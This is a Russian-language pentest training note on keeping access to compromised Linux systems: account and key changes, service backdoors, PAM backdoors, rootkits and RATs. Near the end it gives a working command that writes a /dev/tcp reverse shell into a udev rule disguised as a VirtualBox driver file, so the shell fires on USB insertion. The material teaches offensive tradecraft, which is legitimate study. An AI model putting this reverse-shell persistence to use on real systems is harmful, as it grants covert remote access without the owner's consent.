## **Основные понятия**

**Закрепление доступа** — это набор методов, которые атакующие используют для сохранения доступа к системам после  
перезагрузки, изменения учетных данных и других изменений, которые могли бы прервать их доступ.  
  
**Backdoor** _(англ. Тайная дверь)_ — Backdoor - это скрытый способ доступа к системе, приложению или устройству, который обычно используется для обхода стандартных механизмов аутентификации и безопасности.  
  
**MITRE ATT&CK** _(Adversarial Tactics, Techniques, and Common Knowledge)_  это модель для описания тактик, техник и процедур, которые могут использоваться киберпреступниками для осуществления кибератак на организации и компании. Модель MITRE ATT&CK описывает более 200 тактик и приемов, которые могут использоваться киберпреступниками на разных этапах кибератаки - от получения доступа к сети до уничтожения данных и скрытия следов своей деятельности.

## Наше положение в сети

Основная задача в этой точке — **не потерять доступ после захвата какого-либо из сервисов.**
![[1234535.png]]
## Общие принципы

Доступ к скомпрометированной системе можно потерять по следующим причинам:

- Перебои в работе сети
- Нестабильный код нагрузки
- Вмешательство команды реагирования на инцидент или администратора
- Перезагрузка системы и пр.

> ВАЖНО: потерять доступ к скомпрометированной системе может быть критически недопустимо, т.к. впоследствии доступа можно уже не получить.

В том числе, поэтому важно отразить, что данный этап может быть исполнен сразу после успешного проведения первичных атак.

**Категории методов закрепления доступа**

Процесс закрепления доступа насчитывает сотни приемов, предоставляющих доступ к системе различными каналами, мы рассмотрим некоторые из них, но все примеры можно разбить на категории по степени “инвазивности”:

Менее "инвазивные":

- Получение легитимного доступа к системе (получение информации об легитимных учетных данных, ключах доступа, правилах доступа)
    
- Внесение изменений в легитимные механизмы доступа (добавление учетных записей, изменение паролей учетных записей, внесение собственных ключей доступа,  добавление устройств и пр.)
    

Более "инвазивные":

- Внесение изменений в сервисы и внешние программы в ОС (получение доступа через веб-сервисы, файловые серверы, VPN сервер и пр.)
    
- Внесение изменений в ядро ОС и предустановленные службы работающие на уровне ядра (внесение изменений: в автозагрузчик, модули аутентикации, в системные процессы, в загрузчик ядра, в ядро ОС, в скрипты инициализации, в обработчики событий \ прерываний и пр.)


## **Получение легитимного доступа к системе**

Данная категория раскрывает методы закрепления доступа, позволяющие закреплять доступ к системе, не внося в систему  
изменения, используя существующие учетные данные и способы доступа к системе.

**Плюсы подхода:**

- Наименее заметный для команды реагирования подход к закреплению доступа, т.к. в систему не вносится никаких изменений, которые можно было бы заметить.
- Такой подход может предоставлять доступ достаточно долго, если инцидент с компрометацией системы не был обнаружен.

**Минусы подхода:**

- Если инцидент компрометации стал известен, то самой очевидной из практик защиты становится изменения паролей и ключей доступа к системе, что несет собой потерю доступа к системе для пентестера.
- Такой подход не работает лучше при использовании совмещения его с другими подходами, т.к. если мы используем _инвазивные методы закрепления_, в случаи их обнаружения мы потеряем и данный способ закрепления.
- Учетные данные могут быть изменены и без обнаружения факта компрометации системы по воле оператора, обслуживающего систему.

**Получение легитимного доступа к системе может быть достигнуто следующими практиками:**

- Извлечение паролей и ключей из доступных файлов в ОС
- Восстановление паролей из хешей
- Подбор паролей методом перебора
- Восстановление паролей и ключей из памяти процессов



## Внесение изменений в легитимные механизмы доступа

Подходы в данной категории вносят в систему минимальные изменения, используя существующие механизмы аутентификации, но добавляя в них новые сущности и условия.

**Плюсы подхода:**

- Наиболее простой из существующих подходов, который может использоваться для быстрого продвижения по сети.
- Может быть легко модифицирован для меньшей заметности изменений в системе.

**Минусы подхода:**

- Крайне заметный метод, в связи с постоянным пристальным аудитом изменений учетных записей в ОС или в домене со стороны команд реагирования.
- Как и прошлый метод, не гарантирует закрепления в системе, т.к. администратор или оператор системы может по своей воле изменить учетные данные скомпрометированного аккаунта.

**Примеры действий:**

- Создание нового пользователя
- Изменение учетных данных пользователя
- Добавление ключей доступа
- Сброс до стандартных паролей и учетных данных в сервисах
- Открытие механизмов отладки в службах



## Внесение изменений в сервисы и внешние программы в ОС

Способы закрепления доступа через внесение изменений в сервисы и внешние программы подразумевают изменения конфигурации или программного кода, постоянно работающих в ОС и доступных для взаимодействия с пользователями извне.

**Плюсы подхода:**

- Достаточно скрытный метод закрепления доступа, т.к. логирование изменений в сервисах происходит на общем уровне внесения изменений в файловую систему, что может быть сложнее заметить команде реагирования.
- На доступность такого метода не влияет изменений учетных данных, прав доступа пользователей ОС.
- Заложенные backdoor’ы в программный код сервисов могут быть обнаружены только профессионалами, понимающими природу возникновения уязвимостей и умеющих отличить уязвимостей поведение от нормального.
- Также одним из способов закрепления может быть обнаружение прочих уязвимостей сервиса без внесения в него изменений.

**Минусы подхода:**

- В случае отката версии кода сервиса к последней стабильной, такой доступ может быть потерян. А это вероятно, если администратор сочтет поведение сервиса странным.
- Может быть замечен если в ОС стоит аудит внесения изменения в файловую систему и в особенности в файлы конфигурации.

**Примеры:**

- Внедрение бэкдоров в сервисы ОС
- Внедрение уязвимого поведения в сервисы ОС, для последующей эксплуатации уязвимостей
- Запуск внешних программ для получения последующего контроля


## Внесение изменений в ядро ОС и в предустановленные службы на нем

Самые продвинутые и зачастую самые надежные подходы по закреплению доступа - это серия методов, позволяющих проникать глубоко в ядро ОС и изменять стандартные службы удаленного доступа, аутентификации, обработки событий и пр.

**Плюсы подхода:**

- Некоторые из методов почти невозможно обнаружить при использовании стандартных средств анализа ОС, только используя глубокий анализ дампа памяти ОС. (Существуют методы, которые скрывают свое наличие при входе на сервер администратора и потом возвращают свое присутствие)
- Такие методы зачастую могут действовать даже после обновления ОС, и в частных случаях даже после переустановки ОС.
- Реализовать такой метод без действий, которые могут быть замечены в ходе выполнения, может быть не просто.

**Минусы подхода:**

- Высокая сложность реализации таких методов, а также сложность их отладки.
- Разница в версии ОС или дистрибутиве может быть критически важной для выбора метода закрепления из этой категории.

Одним из самых популярных примеров внесения изменений в ядро ОС и закреплением на уровне ядра, может быть использование программ под общим названием **RootKit**.  
  
**Rootkit** — это вид вредоносного программного обеспечения, которое скрывает свою присутствие на компьютере или другом  
устройстве, изменяя функциональность операционной системы и скрывая свои следы от пользователей и системных программ.



Также для закрепления доступа используют ПО, именуемое **Remote Admin Tool**, что по своей сути очень похоже на **RootKit**, но  
иногда не претендует на скрытность. Тем не менее, в этой категории также присутствуют заметные представители. В том числе существуют легальные RAT-средства.

**Утилиты RAT (Remote Access Tool)** — это программные инструменты, которые позволяют удаленно управлять компьютером или устройством без ведома пользователя. **RAT-**утилиты могут быть использованы для различных целей, в том числе для управления компьютером из удаленного места, сбора конфиденциальной информации, мониторинга активности пользователя и т.д.




**Внедрение бэкдоров модули аутентификации на основе PAM**

**PAM (Pluggable Authentication Modules**_, подключаемые модули аутентификации)_ — разделяемые библиотеки, используемые для  
реализации произвольных методов аутентификации в виде единого **API**. Внедрение вредоносного модуля позволяет добавить  
мастер-пароль и перехватить учетные данные.

Внедрение бэкдоров в драйверы
Для запуска бэкдора при подключении какого-либо устройства можно использовать каталог /etc/udev/rules.d/, в котором хранятся правила для обработки событий устройств. Изменяя эти правила, можно переименовать устройство, настроить права доступа к нему, но самое главное, что нас интересует — выполнить скрипт при подключении устройства.

RSHELL="0<&196;exec 196<>/dev/tcp/192.168.0.177/9001; sh <&196 >&196 2>&196"
echo "ACTION==\"add\",ENV{DEVTYPE}==\"usb_device\",SUBSYSTEM==\"usb\",RUN+=\"$RSHELL\"" | tee /etc/udev/rules.d/71-vbox-kernel-drivers.rules > /dev/null

В таком случае при подключении к машине USB-устройства порт выполнится скрипт RSHELL для предоставления доступа вашей машине в сети.

Внедрение бекдоров в службы автозапуска (использование systemd)

systemd — это системный инициализатор и менеджер служб для операционных систем Linux. Он является заменой для более старой системы инициализации SysVinit и предоставляет целый набор функциональных возможностей для управления и контроля запуска служб и процессов в Linux-системе.



